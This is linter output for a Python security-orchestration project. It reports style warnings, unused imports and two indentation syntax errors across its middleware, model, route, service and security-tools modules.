92 |         super().__init__(app)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> orchestrator\autonomous-incident-reflex-system\middleware.py:97:1
   |
95 |         self.tokens = {}  # client_id -> (tokens, last_update)
96 |         self.rate = requests_per_minute / 60.0  # tokens per second
97 |     
   | ^^^^
98 |     async def dispatch(self, request: Request, call_next: Callable):
99 |         # Skip health checks and metrics
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:102:1
    |
100 |         if request.url.path in ["/health", "/health/ready", "/health/live", "/metrics"]:
101 |             return await call_next(request)
102 |         
    | ^^^^^^^^
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:105:1
    |
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
105 |         
    | ^^^^^^^^
106 |         # Check rate limit
107 |         if not self._allow_request(client_id):
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:120:1
    |
118 |                 headers={"Retry-After": "60"},
119 |             )
120 |         
    | ^^^^^^^^
121 |         return await call_next(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:122:1
    |
121 |         return await call_next(request)
122 |     
    | ^^^^
123 |     def _get_client_id(self, request: Request) -> str:
124 |         """Get client identifier for rate limiting"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:128:1
    |
126 |         if hasattr(request.state, "user"):
127 |             return f"user:{request.state.user}"
128 |         
    | ^^^^^^^^
129 |         # Fall back to IP address
130 |         forwarded_for = request.headers.get("X-Forwarded-For")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:133:1
    |
131 |         if forwarded_for:
132 |             return f"ip:{forwarded_for.split(',')[0].strip()}"
133 |         
    | ^^^^^^^^
134 |         return f"ip:{request.client.host}"
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:135:1
    |
134 |         return f"ip:{request.client.host}"
135 |     
    | ^^^^
136 |     def _allow_request(self, client_id: str) -> bool:
137 |         """Check if request is allowed (token bucket algorithm)"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:139:1
    |
137 |         """Check if request is allowed (token bucket algorithm)"""
138 |         now = time.time()
139 |         
    | ^^^^^^^^
140 |         if client_id not in self.tokens:
141 |             self.tokens[client_id] = (self.burst - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:143:1
    |
141 |             self.tokens[client_id] = (self.burst - 1, now)
142 |             return True
143 |         
    | ^^^^^^^^
144 |         tokens, last_update = self.tokens[client_id]
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:145:1
    |
144 |         tokens, last_update = self.tokens[client_id]
145 |         
    | ^^^^^^^^
146 |         # Add tokens based on time elapsed
147 |         elapsed = now - last_update
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:149:1
    |
147 |         elapsed = now - last_update
148 |         tokens = min(self.burst, tokens + elapsed * self.rate)
149 |         
    | ^^^^^^^^
150 |         if tokens >= 1:
151 |             self.tokens[client_id] = (tokens - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:160:1
    |
158 | class AuthenticationMiddleware(BaseHTTPMiddleware):
159 |     """Authentication middleware"""
160 |     
    | ^^^^
161 |     # Public endpoints that don't require authentication
162 |     PUBLIC_PATHS = [
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:173:1
    |
171 |         "/api/v1/openapi.json",
172 |     ]
173 |     
    | ^^^^
174 |     async def dispatch(self, request: Request, call_next: Callable):
175 |         # Skip public endpoints
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:178:1
    |
176 |         if request.url.path in self.PUBLIC_PATHS:
177 |             return await call_next(request)
178 |         
    | ^^^^^^^^
179 |         # Try authentication
180 |         authenticated = False
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:182:1
    |
180 |         authenticated = False
181 |         user = None
182 |         
    | ^^^^^^^^
183 | # Try API key authentication
184 |         api_key = request.headers.get("X-API-Key")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:210:1
    |
208 |                 headers={"WWW-Authenticate": "Bearer"},
209 |             )
210 |         
    | ^^^^^^^^
211 |         # Add user to request state
212 |         request.state.user = user
    |
help: Remove whitespace from blank line

invalid-syntax: unindent does not match any outer indentation level
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:212:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
    | ^^^^^^^^
213 |         
214 |         return await call_next(request)
    |

W293 Blank line contains whitespace
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:213:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
213 |         
    | ^^^^^^^^
214 |         return await call_next(request)
    |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> orchestrator\autonomous-incident-reflex-system\middleware.py:214:1
    |
212 |         request.state.user = user
213 |         
214 |         return await call_next(request)
    | ^^^^^^^^
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> orchestrator\autonomous-incident-reflex-system\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> orchestrator\autonomous-incident-reflex-system\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\models.py:18:15
   |
16 |     incident_type: str
17 |     description: str
18 |     metadata: Dict[str, Any]
   |               ^^^^
19 |     status: str = "detected"  # detected, analyzing, reflex_triggered, closed
20 |     evidence_hash: Optional[str] = None
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\models.py:20:20
   |
18 |     metadata: Dict[str, Any]
19 |     status: str = "detected"  # detected, analyzing, reflex_triggered, closed
20 |     evidence_hash: Optional[str] = None
   |                    ^^^^^^^^^^^^^
21 |     reflex_actions_taken: List[str] = []
22 |     created_at: datetime = Field(default_factory=datetime.now)
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\models.py:21:27
   |
19 |     status: str = "detected"  # detected, analyzing, reflex_triggered, closed
20 |     evidence_hash: Optional[str] = None
21 |     reflex_actions_taken: List[str] = []
   |                           ^^^^
22 |     created_at: datetime = Field(default_factory=datetime.now)
23 |     updated_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\models.py:31:15
   |
29 |     incident_type: str
30 |     description: str
31 |     metadata: Dict[str, Any]
   |               ^^^^
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\models.py:35:13
   |
34 | class IncidentUpdate(BaseModel):
35 |     status: Optional[str] = None
   |             ^^^^^^^^^^^^^
36 |     evidence_hash: Optional[str] = None
37 |     reflex_actions_taken: Optional[List[str]] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\models.py:36:20
   |
34 | class IncidentUpdate(BaseModel):
35 |     status: Optional[str] = None
36 |     evidence_hash: Optional[str] = None
   |                    ^^^^^^^^^^^^^
37 |     reflex_actions_taken: Optional[List[str]] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\models.py:37:27
   |
35 |     status: Optional[str] = None
36 |     evidence_hash: Optional[str] = None
37 |     reflex_actions_taken: Optional[List[str]] = None
   |                           ^^^^^^^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\models.py:37:36
   |
35 |     status: Optional[str] = None
36 |     evidence_hash: Optional[str] = None
37 |     reflex_actions_taken: Optional[List[str]] = None
   |                                    ^^^^
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\models.py:41:12
   |
40 | class PaginatedIncidents(BaseModel):
41 |     items: List[SecurityIncident]
   |            ^^^^
42 |     total: int
43 |     page: int
   |
help: Replace with `list`

F401 [*] `time` imported but unused
 --> orchestrator\autonomous-incident-reflex-system\repository.py:5:8
  |
3 | """
4 |
5 | import time
  |        ^^^^
6 | from datetime import datetime
7 | from typing import Any, Dict, List, Optional, Tuple
  |
help: Remove unused import: `time`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> orchestrator\autonomous-incident-reflex-system\repository.py:7:1
  |
5 | import time
6 | from datetime import datetime
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> orchestrator\autonomous-incident-reflex-system\repository.py:7:1
  |
5 | import time
6 | from datetime import datetime
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> orchestrator\autonomous-incident-reflex-system\repository.py:7:1
  |
5 | import time
6 | from datetime import datetime
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\repository.py:16:20
   |
14 | class Database:
15 |     def __init__(self):
16 |         self.data: Dict[str, Any] = {"incidents": {}}
   |                    ^^^^
17 |         self.connected = False
   |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\repository.py:37:10
   |
35 |     async def list(
36 |         self, offset: int = 0, limit: int = 20
37 |     ) -> Tuple[List[SecurityIncident], int]:
   |          ^^^^^
38 |         items = list(self.db.data["incidents"].values())
39 |         items.sort(key=lambda x: x.created_at, reverse=True)
   |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\repository.py:37:16
   |
35 |     async def list(
36 |         self, offset: int = 0, limit: int = 20
37 |     ) -> Tuple[List[SecurityIncident], int]:
   |                ^^^^
38 |         items = list(self.db.data["incidents"].values())
39 |         items.sort(key=lambda x: x.created_at, reverse=True)
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\repository.py:42:47
   |
40 |         return items[offset : offset + limit], len(items)
41 |
42 |     async def get(self, incident_id: UUID) -> Optional[SecurityIncident]:
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^^^
43 |         return self.db.data["incidents"].get(str(incident_id))
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\repository.py:50:43
   |
49 |     async def update(
50 |         self, incident_id: UUID, updates: Dict[str, Any]
   |                                           ^^^^
51 |     ) -> SecurityIncident:
52 |         incident = await self.get(incident_id)
   |
help: Replace with `dict`

UP035 `typing.List` is deprecated, use `list` instead
 --> orchestrator\autonomous-incident-reflex-system\routes.py:5:1
  |
3 | """
4 |
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
6 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> orchestrator\autonomous-incident-reflex-system\routes.py:5:20
  |
3 | """
4 |
5 | from typing import List
  |                    ^^^^
6 | from uuid import UUID
  |
help: Remove unused import: `typing.List`

F401 [*] `.logging_config.logger` imported but unused
  --> orchestrator\autonomous-incident-reflex-system\routes.py:10:29
   |
 8 | from fastapi import APIRouter, Body, Depends, Path, Query, status
 9 |
10 | from .logging_config import logger
   |                             ^^^^^^
11 | from .models import (
12 |     IncidentCreate,
   |
help: Remove unused import: `.logging_config.logger`

F401 [*] `.models.IncidentUpdate` imported but unused
  --> orchestrator\autonomous-incident-reflex-system\routes.py:13:5
   |
11 | from .models import (
12 |     IncidentCreate,
13 |     IncidentUpdate,
   |     ^^^^^^^^^^^^^^
14 |     PaginatedIncidents,
15 |     SecurityIncident,
   |
help: Remove unused import: `.models.IncidentUpdate`

B008 Do not perform function call `Depends` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> orchestrator\autonomous-incident-reflex-system\routes.py:32:38
   |
30 |     page: int = Query(1, ge=1),
31 |     page_size: int = Query(20, ge=1, le=100),
32 |     service: IncidentReflexService = Depends(get_reflex_service),
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^
33 | ):
34 |     """List security incidents with pagination"""
   |

B008 Do not perform function call `Body` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> orchestrator\autonomous-incident-reflex-system\routes.py:52:28
   |
50 | )
51 | async def report_incident(
52 |     data: IncidentCreate = Body(...),
   |                            ^^^^^^^^^
53 |     service: IncidentReflexService = Depends(get_reflex_service),
54 | ):
   |

B008 Do not perform function call `Depends` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> orchestrator\autonomous-incident-reflex-system\routes.py:53:38
   |
51 | async def report_incident(
52 |     data: IncidentCreate = Body(...),
53 |     service: IncidentReflexService = Depends(get_reflex_service),
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^
54 | ):
55 |     """Report a new security incident for reflex processing"""
   |

B008 Do not perform function call `Path` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> orchestrator\autonomous-incident-reflex-system\routes.py:65:25
   |
63 | )
64 | async def get_incident(
65 |     incident_id: UUID = Path(..., description="Incident UUID"),
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
66 |     service: IncidentReflexService = Depends(get_reflex_service),
67 | ):
   |

B008 Do not perform function call `Depends` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> orchestrator\autonomous-incident-reflex-system\routes.py:66:38
   |
64 | async def get_incident(
65 |     incident_id: UUID = Path(..., description="Incident UUID"),
66 |     service: IncidentReflexService = Depends(get_reflex_service),
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^
67 | ):
68 |     """Fetch status and evidence of a specific incident"""
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> orchestrator\autonomous-incident-reflex-system\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> orchestrator\autonomous-incident-reflex-system\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\security.py:32:44
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\security.py:32:53
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                                     ^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\autonomous-incident-reflex-system\security.py:49:37
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\security.py:49:46
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                              ^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> orchestrator\autonomous-incident-reflex-system\security.py:103:19
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                   ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> orchestrator\autonomous-incident-reflex-system\security.py:103:29
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                             ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `list`

F401 [*] `datetime.datetime` imported but unused
 --> orchestrator\autonomous-incident-reflex-system\services.py:6:22
  |
5 | import asyncio
6 | from datetime import datetime, timezone
  |                      ^^^^^^^^
7 | from typing import Any, Dict, List, Optional, Tuple
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `datetime.timezone` imported but unused
 --> orchestrator\autonomous-incident-reflex-system\services.py:6:32
  |
5 | import asyncio
6 | from datetime import datetime, timezone
  |                                ^^^^^^^^
7 | from typing import Any, Dict, List, Optional, Tuple
8 | from uuid import UUID
  |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> orchestrator\autonomous-incident-reflex-system\services.py:7:1
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> orchestrator\autonomous-incident-reflex-system\services.py:7:1
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> orchestrator\autonomous-incident-reflex-system\services.py:7:1
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 | from uuid import UUID
  |

F401 [*] `typing.Any` imported but unused
 --> orchestrator\autonomous-incident-reflex-system\services.py:7:20
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  |                    ^^^
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Dict` imported but unused
 --> orchestrator\autonomous-incident-reflex-system\services.py:7:25
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  |                         ^^^^
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> orchestrator\autonomous-incident-reflex-system\services.py:7:37
  |
5 | import asyncio
6 | from datetime import datetime, timezone
7 | from typing import Any, Dict, List, Optional, Tuple
  |                                     ^^^^^^^^
8 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `.models.IncidentUpdate` imported but unused
  --> orchestrator\autonomous-incident-reflex-system\services.py:12:37
   |
10 | from .errors import NotFoundError
11 | from .logging_config import logger
12 | from .models import IncidentCreate, IncidentUpdate, SecurityIncident
   |                                     ^^^^^^^^^^^^^^
13 | from .repository import IncidentRepository
   |
help: Remove unused import: `.models.IncidentUpdate`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\services.py:63:10
   |
61 |     async def list_incidents(
62 |         self, offset: int = 0, limit: int = 20
63 |     ) -> Tuple[List[SecurityIncident], int]:
   |          ^^^^^
64 |         return await self.repository.list(offset, limit)
   |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
  --> orchestrator\autonomous-incident-reflex-system\services.py:63:16
   |
61 |     async def list_incidents(
62 |         self, offset: int = 0, limit: int = 20
63 |     ) -> Tuple[List[SecurityIncident], int]:
   |                ^^^^
64 |         return await self.repository.list(offset, limit)
   |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> orchestrator\cerberus_security_interface.py:9:1
   |
 8 | import logging
 9 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
10 |
11 | from orchestrator.security_tools_service import SecurityToolsService
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> orchestrator\cerberus_security_interface.py:9:1
   |
 8 | import logging
 9 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
10 |
11 | from orchestrator.security_tools_service import SecurityToolsService
   |

F401 [*] `typing.Optional` imported but unused
  --> orchestrator\cerberus_security_interface.py:9:32
   |
 8 | import logging
 9 | from typing import Dict, List, Optional
   |                                ^^^^^^^^
10 |
11 | from orchestrator.security_tools_service import SecurityToolsService
   |
help: Remove unused import: `typing.Optional`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\cerberus_security_interface.py:39:10
   |
37 |         justification: str,
38 |         target: str = "",
39 |     ) -> Dict:
   |          ^^^^
40 |         """
41 |         Request access to a security tool
   |
help: Replace with `dict`

F541 [*] f-string without any placeholders
  --> orchestrator\cerberus_security_interface.py:53:24
   |
51 |             Authorization result with session token if approved
52 |         """
53 |         logger.warning(f"CERBERUS: Requesting tool access")
   |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
54 |         logger.warning(f"  Tool: {tool_category}/{tool_name}")
55 |         logger.warning(f"  Threat: {threat_level.name}")
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
  --> orchestrator\cerberus_security_interface.py:78:28
   |
76 |             }
77 |
78 |             logger.warning(f"CERBERUS: Tool access GRANTED by Triumvirate")
   |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
79 |
80 |             return {
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
  --> orchestrator\cerberus_security_interface.py:87:28
   |
85 |             }
86 |         else:
87 |             logger.warning(f"CERBERUS: Tool access DENIED by Triumvirate")
   |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
88 |
89 |             return {
   |
help: Remove extraneous `f` prefix

UP006 [*] Use `list` instead of `List` for type annotation
  --> orchestrator\cerberus_security_interface.py:96:41
   |
95 |     def execute_authorized_tool(
96 |         self, session_token: str, args: List[str] = None
   |                                         ^^^^
97 |     ) -> Dict:
98 |         """
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\cerberus_security_interface.py:97:10
   |
95 |     def execute_authorized_tool(
96 |         self, session_token: str, args: List[str] = None
97 |     ) -> Dict:
   |          ^^^^
98 |         """
99 |         Execute tool with approved session token
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> orchestrator\cerberus_security_interface.py:127:10
    |
125 |     def assess_and_deploy(
126 |         self, threat_description: str, suggested_tool: str, target: str = ""
127 |     ) -> Dict:
    |          ^^^^
128 |         """
129 |         High-level interface: Assess threat and deploy appropriate tool
    |
help: Replace with `dict`

W291 Trailing whitespace
  --> orchestrator\security_tools_service.py:9:32
   |
 7 | - Web: Web application security
 8 | - Windows: Windows security testing
 9 | - Linux: Linux security testing  
   |                                ^^
10 | - Red-teaming: Offensive security tools
11 | - OSINT: Open Source Intelligence
   |
help: Remove trailing whitespace

F401 [*] `os` imported but unused
  --> orchestrator\security_tools_service.py:15:8
   |
13 | """
14 |
15 | import os
   |        ^^
16 | import subprocess
17 | from pathlib import Path
   |
help: Remove unused import: `os`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> orchestrator\security_tools_service.py:18:1
   |
16 | import subprocess
17 | from pathlib import Path
18 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> orchestrator\security_tools_service.py:18:1
   |
16 | import subprocess
17 | from pathlib import Path
18 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\security_tools_service.py:32:39
   |
30 |         self.categories = self._discover_categories()
31 |
32 |     def _discover_categories(self) -> Dict[str, Path]:
   |                                       ^^^^
33 |         """Discover available tool categories"""
34 |         categories = {}
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> orchestrator\security_tools_service.py:45:34
   |
43 |         return categories
44 |
45 |     def list_categories(self) -> List[str]:
   |                                  ^^^^
46 |         """List all available tool categories"""
47 |         return list(self.categories.keys())
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> orchestrator\security_tools_service.py:49:44
   |
47 |         return list(self.categories.keys())
48 |
49 |     def list_tools(self, category: str) -> List[Dict[str, str]]:
   |                                            ^^^^
50 |         """List tools in a specific category"""
51 |         if category not in self.categories:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\security_tools_service.py:49:49
   |
47 |         return list(self.categories.keys())
48 |
49 |     def list_tools(self, category: str) -> List[Dict[str, str]]:
   |                                                 ^^^^
50 |         """List tools in a specific category"""
51 |         if category not in self.categories:
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> orchestrator\security_tools_service.py:70:63
   |
68 |         return tools
69 |
70 |     def get_tool_info(self, category: str, tool_name: str) -> Optional[Dict]:
   |                                                               ^^^^^^^^^^^^^^
71 |         """Get detailed information about a specific tool"""
72 |         tools = self.list_tools(category)
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> orchestrator\security_tools_service.py:70:72
   |
68 |         return tools
69 |
70 |     def get_tool_info(self, category: str, tool_name: str) -> Optional[Dict]:
   |                                                                        ^^^^
71 |         """Get detailed information about a specific tool"""
72 |         tools = self.list_tools(category)
   |
help: Replace with `dict`

UP015 [*] Unnecessary mode argument
  --> orchestrator\security_tools_service.py:87:34
   |
85 |         """Extract description from tool file"""
86 |         try:
87 |             with open(tool_path, "r", encoding="utf-8", errors="ignore") as f:
   |                                  ^^^
88 |                 lines = f.readlines()[:20]  # Read first 20 lines
   |
help: Remove mode argument

UP006 [*] Use `list` instead of `List` for type annotation
   --> orchestrator\security_tools_service.py:112:15
    |
110 |         category: str,
111 |         tool_name: str,
112 |         args: List[str] = None,
    |               ^^^^
113 |         session_token: str = None,
114 |     ) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> orchestrator\security_tools_service.py:114:10
    |
112 |         args: List[str] = None,
113 |         session_token: str = None,
114 |     ) -> Dict:
    |          ^^^^
115 |         """
116 |         Execute a security tool (use with caution!)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> orchestrator\security_tools_service.py:205:33
    |
203 |         self.service = SecurityToolsService()
204 |
205 |     def get_categories(self) -> Dict[str, List[str]]:
    |                                 ^^^^
206 |         """Get all categories and their tools"""
207 |         result = {}
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> orchestrator\security_tools_service.py:205:43
    |
203 |         self.service = SecurityToolsService()
204 |
205 |     def get_categories(self) -> Dict[str, List[str]]:
    |                                           ^^^^
206 |         """Get all categories and their tools"""
207 |         result = {}
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> orchestrator\security_tools_service.py:215:43
    |
213 |         return result
214 |
215 |     def search_tools(self, query: str) -> List[Dict]:
    |                                           ^^^^
216 |         """Search for tools by name or category"""
217 |         results = []
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> orchestrator\security_tools_service.py:215:48
    |
213 |         return result
214 |
215 |     def search_tools(self, query: str) -> List[Dict]:
    |                                                ^^^^
216 |         """Search for tools by name or category"""
217 |         results = []
    |
help: Replace with `dict`

